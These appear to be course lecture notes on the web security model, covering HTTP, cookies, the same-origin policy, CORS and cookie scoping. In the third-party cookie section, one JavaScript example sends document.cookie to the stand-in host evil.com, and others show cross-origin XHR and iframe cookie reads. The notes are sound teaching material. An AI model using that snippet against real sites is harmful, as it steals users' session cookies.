# Web Security Model

## Web security goals

* Safely browse the web:
    - Sites should not be able to steal data from device, install malware, access camera, etc
    - Sites should not be able to affect or eavesdrop on other sessions
* Support secure high-performance web apps
    - Web-based applications should have same or better security properties as desktop applications

## Attack models

* Malicious website
* Malicious external resources
* Network attacker
* Malware attacker

## HTTP protocol

* ASCII protocol from 1989 that allows fetching resources (e.g. HTML file) from a server
    - Two messages: request and response
    - Stateless protocol beyond a single request and response
* Every request has a uniform resource location (URL)

![URL](/notes/images/cs155/2022-04-18-url.png)

* Request looks like

    ```http
    GET /index.html HTTP/1.1 
    Accept: image/gif, image/x-bitmap, image/jpeg, */*
    Accept-Language: en
    Connection: Keep-Alive
    User-Agent: Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)
    Host: www.example.com
    Referer: http://www.google.com?q=dingbats
    ```
    - First line: method, path, version
    - Rest: headers
    - There can be a body, but is empty here
* Response looks like
    ```http
    HTTP/1.0 200 OK
    Date: Sun, 21 Apr 1996 02:20:42 GMT
    Server: Microsoft-Internet-Information-Server/5.0
    Content-Type: text/html
    Last-Modified: Thu, 18 Apr 1996 17:39:05 GMT
    Content-Length: 2543

    <html>Some data... announcement! ... </html>
    ```
    - First line: status code
    - Until empty line: headers
    - After empty line: body
* HTTP/2: released in 2015, mainly performance improvements

### HTTP methods

- `GET`: get the resource at the specified URL (does not accept message body)
    - Should not change server state (some servers do perform side effects)
- `POST`: create new resource at URL with payload
- `PUT`: replace target resource with request payload
- `PATCH`: update part of the resource
- `DELETE`: delete specified URL

### External resources

* When loading a website, browser sends `GET` request to site, server sends HTML file back
    - Root HTML page can include additional resources (e.g. images, video, fonts)
        - Can include images from different domain
        - Can also load other *websites* within their window: frames/iframes
            - Allows delegating screen area to content from another source (e.g. ads)
    - After parsing page HTML, browser requests additional resources

### Javascript

* Websites deliver scripts to be run inside of the browser
    - Additional web requests
    - Read browser data
    - Manipulate page
    - Access local hardware
* Document Object Model (DOM):
    - Javascript reads/modify pages by interacting with DOM tree
    - Object-oriented interface for reading/writing page content
    - Browser takes HTML -> structured data (DOM)
* Basic execution model:
    - Loads content of root page
    - Parses HTML and runs included Javascript
    - Fetches additional resources (e.g. images, CSS, Javascript, iframes)
    - Responds to events like `onClick`, `onLoad`, etc.
    - Iterate until page is done loading (which might be never)

### Session management via cookies

* HTTP is stateless: no session information saved on server
* Session management done via cookies: small pieces of data that a server sends to a browser
    - Browser may store and send back in future requests to site
    - Useful for:
        - Session management (e.g. logins)
        - Personalization (e.g. user preferences)
        - Tracking
* Setting cookie: in HTTP response header
    ```http
    Set-Cookie: trackingID=3272923427328234
    Set-Cookie: userID=F3D947C2
    ```
* Sending cookie: in HTTP request header
    ```http
    Cookie: trackingID=3272923427328234
    Cookie: userID=F3D947C2
    ```
* Example: session involving login
    ![Login with cookies](/notes/images/cs155/2022-04-18-login-cookies.png)
* Websites of the same origin have access to each other's cookies, even if opened in different tabs
* Cookies set by a domain are always sent for any request to that domain
    - Includes subrequests made by a different domain
    - Includes both GET and POST requests

## Web Security Model

* Subjects:
    - Origins: a unique `scheme://domain:port`
    - The following are different origins:
        ```
        http://saligrama.io
        http://www.saligrama.io
        http://saligrama.io:8080
        https://saligrama.io
        ```
    - The following are the same origin:
        ```
        https://saligrama.io
        https://saligrama.io:443
        https://saligrama.io/experience
        ```
* Objects:
    - DOM tree, DOM storage, cookies, Javascript namespace, hardware permissions
* Same Origin Policy (SOP)
    - Goal: isolate content of different origins
        - Confidentiality: script on `evil.com` should not be allowed to read `bank.ch`
        - Integrity: `evil.com` should not be able to modify the content of `bank.ch`
    - Bounding origins: windows
        - Every window and frame has an origin
        - Origins are blocked from accessing another origin's objects
        - If `bank.com` is loaded in a tab and so is `attacker.com` then `attacker.com` cannot
            - Read or write content from `bank.com`
            - Read or write `bank.com`'s cookies
            - Detect that the other tab has `bank.com` loaded
        - If `bank.com` is loaded in an iframe in `attacker.com` then `attacker.com` cannot
            - Read content from `bank.com`'s frame
            - Access `bank.com`'s cookies
                - If cookies are included, browser will fulfill the request and potentially display it to the user, but `attacker.com` cannot actually read the cookies
            - Detect that `bank.com` has loaded
                - Note: loading content != seeing or reading said content
        - For other HTTP resources:
            - Images: browser renders cross-origin images, but SOP prevents page from inspecting individual pixels
                - Can check size and loading status
            - CSS, Fonts: can load and use, but not directly inspect
            - Scripts: can be loaded from other origins, scripts execute with privileges of parent frame/windows origin
                - Cannot view source, but can call API functions
                - Allows loading library from CDN and using it to alter page
                - If a malicious library is loaded, it can also steal data (e.g. cookies)

### Domain relaxation

* Can change `document.domain` to be a superdomain
    - `a.domain.com` -> `domain.com` is ok
    - `b.domain.com` -> `domain.com` is ok
    - `a.domain.com` -> `com` is not ok
    - `a.domain.co.uk` -> `co.uk` is not ok
    - Checks against Public Suffix List
* Domain relaxation attacks:
    - `malicious.github.io` can set domain to `github.io` and steal GitHub login credentials
    - Solution: both sides must set `document.domain` to `github.io` to share data (`github.io` effectively grants permissions)

### Same-Origin Policy for Javascript

* Javascript can make network requests to load additional content or submit forms using XMLHTTPRequests (XHR)
    ```js
    $.ajax({url: “/article/example“, success: function(result){
        $("#div1").html(result);
    }});
    ```
* Malicious XHR:
    ```js
    // on attacker.com
    $.ajax({url: “https://bank.com/account“,
        success: function(result){
            $("#div1").html(result);
        }
    });
    ```
* Same-Origin Policy for XHR
    - Can only read data from `GET` responses if they're from same origin, or if destination origin gives permission to read its data
    - Cannot make `POST` or `PUT` requests to a different origin, unless destination origin grants permissions to do so
    - XHR requests (both sending and receiving side) are policed by Cross-Origin Resource Sharing (CORS)
* Cross-Origin Resource Sharing (CORS)
    - Reading permission: servers add `Access-Control-Allow-Origin` header that tells browser to allow Javascript to allow access for another origin
    - Sending permission: performs "pre-flight" permission check to determine whether server is willing to receive request from origin
        - Except for simple requests that could be made without Javascript
        - Requests must meet all of following criteria to avoid such a trip:
            1. Method: `GET`, `HEAD`, `POST`
            2. If sending data, content type is `application/x-www-form-urlencoded` or `multipart/form-data` or `text/plain`
            3. No custom HTTP headers, only some standardized ones
    - Example: CORS success
        ![CORS success](/notes/images/cs155/2022-04-18-cors-success.png)
    - Example: CORS failure
        ![CORS failure](/notes/images/cs155/2022-04-18-cors-failure.png)

### Same-Origin Policy for Cookies

* Cookies have different definition of origin than DOM: `(domain, path)`
    - e.g. `(cs155.stanford.edu, /foo/bar)`
* A page can set cookie for its domain or any parent domain (as long as parent domain is not a public suffix)
    - Can set a cookie for its path or any parent path
    - e.g. `stanford.edu` cannot set for `cs155.stanford.edu`, but vice versa is possible
    - e.g. `website.com/login` can set cookie for `website.com`, but not vice versa
* Browser sends cookies that are in a URL's scope
    - Scope: belongs to domain or parent domain, and is located at the same path or parent path

#### Javascript cookie access

* Developers can additionally manipulate in-scope cookies through Javascript by modifying values in `document.cookie`:
    ```js
    document.cookie = "name=aditya";
    function alertCookie() {
        alert(document.cookie);
    }
    ```
    ```html
    <button onclick="alertCookie()">Show Cookies</button>
    ```
* This leads to a SOP policy collision. On `cs.stanford.edu/zakir`, run the following code, which will actually show `dabo`'s cookies on `zakir`'s page:
    ```js
    const iframe = document.createElement("iframe");
    iframe.src = "https://cs.stanford.edu/dabo";
    document.body.appendChild(iframe);
    alert(iframe.contentWindow.document.cookie);
    ```

#### Third-party cookie access

* If bank inclues Google Analytics Javascript (from `google.com`), it can access bank's auth. cookie, since Javascript always runs with permissions of the window
    ```js
    const img = document.createElement("image");
    img.src = "https://evil.com/?cookies=" + document.cookie;
    document.body.appendChild(/notes/images/cs155);
    ```
* To prevent: HttpOnly Cookies - setting to prevent cookies from being accessed by `document.cookie` API
    - Never sent by browser because `(google.com, /)` does not match `(bank.com, /)`
    - Cannot be extracted by Google Javascript that runs on `bank.com`
    ```http
    Set-Cookie: id=a3fWa; Expires=Thu, 21 Apr 2022 16:20:00 GMT; HttpOnly
    ```
    - This is OK if everything is done over TLS, so network attacker cannot see traffic
    - However, if attacker tricks user into visiting `http://bank.com`, since there is no scheme in Cookie SOP, attacker can see the cookie
* Secure Cookies: only send to server with an encrypted request over HTTPS protocol
    ```http
    Set-Cookie: id=a3fWa; Expires=Thu, 21 Apr 2022 16:20:00 GMT; Secure
    ```